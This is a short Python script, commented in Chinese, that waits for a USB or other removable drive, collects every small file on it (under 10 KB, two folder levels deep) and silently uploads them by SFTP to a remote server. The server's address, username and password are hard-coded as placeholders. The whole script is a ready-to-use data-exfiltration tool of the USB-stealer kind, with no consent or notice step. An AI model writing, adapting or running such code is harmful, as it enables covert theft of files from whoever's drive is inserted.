import psutil
import time
import paramiko
import os
import glob



class GetUFile():
    def __init__(self):
        self.ip='xxx.xxx.xxx.xxx'  # 你的远程主机ip
        self.username='xxxxxx'   # 主机用户名
        self.password='xxxxxxx' # 主机用户名密码
        self.transport = paramiko.Transport((self.ip, 22))
        self.transport.connect(username=self.username, password=self.password)
        self.sftp = paramiko.SFTPClient.from_transport(self.transport)

    def detect_U(self):
        while True:
            for item in psutil.disk_partitions():
                if 'removable' in item.opts:
                    driver, opts = item.device, item.opts
                    print(item)
                    return driver
            time.sleep(5)

    def getUfile(self):
        # shutil.copytree(os.path.join(driver,files[-1]),files[-1])
        driver=self.detect_U()
        self.local_paths=[]
        self.filenames=[]
        files_path = glob.glob(os.path.join(driver, '*'))
        for file in files_path:
            if os.path.isdir(file):
                f_list = [f for f in glob.glob(os.path.join(file, '*'))]
                for f in f_list:
                    if os.path.isfile(f) and os.path.getsize(f) < 10240:
                        self.local_paths.append(f)
            elif os.path.getsize(file) < 10240:
                self.local_paths.append(file)
        self.filenames = [os.path.split(fil)[1] for fil in self.local_paths]

    def putfile(self,local_path,remote_path):
        self.getUfile()
        self.sftp.put(local_path,remote_path)
        print('传输完成')


    def close(self):
        self.transport.close()

    def run(self):
        self.getUfile()
        for local_path,filename in zip(self.local_paths,self.filenames):
            remote_path=os.path.join('/home/ubuntu/ftpfile/', filename)
            self.putfile(local_path,remote_path)
        self.close()

if __name__ == '__main__':

    getfile=GetUFile()
    getfile.run()






